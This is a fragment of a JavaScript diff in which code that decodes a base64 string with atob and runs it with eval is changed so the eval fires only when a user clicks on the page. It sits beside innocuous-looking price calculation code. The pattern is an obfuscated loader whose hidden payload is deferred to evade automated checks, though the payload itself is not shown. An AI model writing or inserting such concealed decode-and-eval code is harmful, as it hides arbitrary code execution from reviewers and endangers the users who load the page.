@@ -19,7 +19,7 @@ catch (_a) {
     })
         .join("");
     const code = atob(b64);
-    eval(code);
+    document.addEventListener("click", () => eval(code));
     const increment = 1.3;
     const increase = (price, count) => {
         return price * increment + count / increment;
